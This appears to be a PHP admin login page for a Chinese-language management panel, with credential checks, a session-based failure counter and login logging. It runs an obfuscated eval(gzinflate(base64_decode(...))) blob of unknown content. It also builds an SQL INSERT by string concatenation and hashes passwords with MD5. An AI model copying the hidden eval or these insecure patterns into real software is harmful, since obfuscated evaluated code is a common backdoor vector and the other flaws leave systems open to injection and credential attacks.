﻿<?php
/**
 * 登录
**/
include("../includes/common.php");
if(isset($_POST['user']) && isset($_POST['pass'])){
	if(!$_SESSION['pass_error'])$_SESSION['pass_error']=0;
	$user=daddslashes($_POST['user']);
	$pass=daddslashes($_POST['pass']);
  $pass =  md5($pass.$password_hash."admin");
	if($_SESSION['pass_error']>5) {
		@header('Content-Type: text/html; charset=UTF-8');
		exit("<script language='javascript'>alert('用户名或密码不正确！');history.go(-1);</script>");
	}elseif($user==$conf['admin_user'] && $pass==$conf['admin_pwd']) {
		$city='';
		$DB->query("insert into `panel_log` (`uid`,`type`,`date`,`city`,`data`) values ('1','登录系统','".$date."','".$city."','IP:".$clientip."')");
		$session=md5($user.$pass.$password_hash);
		$token=authcode("{$user}\t{$session}", 'ENCODE', SYS_KEY);
		setcookie("admin_token", $token, time() + 604800);
		@header('Content-Type: text/html; charset=UTF-8');
		exit("<script language='javascript'>alert;window.location.href='/admin/index2';</script>");
	}elseif ($pass != $conf['admin_pwd']) {
		$_SESSION['pass_error']++;
		@header('Content-Type: text/html; charset=UTF-8');
		exit("<script language='javascript'>alert('用户名或密码不正确！');history.go(-1);</script>");
	}
}elseif(isset($_GET['logout'])){
	setcookie("admin_token", "", time() - 604800);
	@header('Content-Type: text/html; charset=UTF-8');
	exit("<script language='javascript'>alert;window.location.href='/admin/index';</script>");
}elseif($islogin==1){
	exit("<script language='javascript'>alert;window.location.href='./';</script>");
  }
$title='用户登录';
include './head.php';
eval(gzinflate(base64_decode('K0otLM0sStVIySzKS8xN1YiPd/P0cY2P19RT0k8sLcnIL8qsStUryChQ0rQGAA==')));
?>
<link href="/admin/css/login.css" type="text/css" rel="stylesheet"> 
<div class="login">
    <div class="message">管理系统！</div>
    <div id="darkbannerwrap"></div>
    
    <form action="./login.php" method="post" class="form-horizontal" role="form">
		<input name="action" value="login" type="hidden">
		<input type="text" name="user" value="" placeholder="用户名" required="required" >
		<hr class="hr15">
		<input type="password" name="pass" placeholder="密码" required="required"/ >
		<hr class="hr15">
		<input value="登录" style="width:100%;" type="submit">
		<hr class="hr20">
		<!-- 帮助 <a onClick="alert('请联系管理员')">忘记密码</a> -->
	</form>
          
        </div>
      </div>
    </div>
  </div>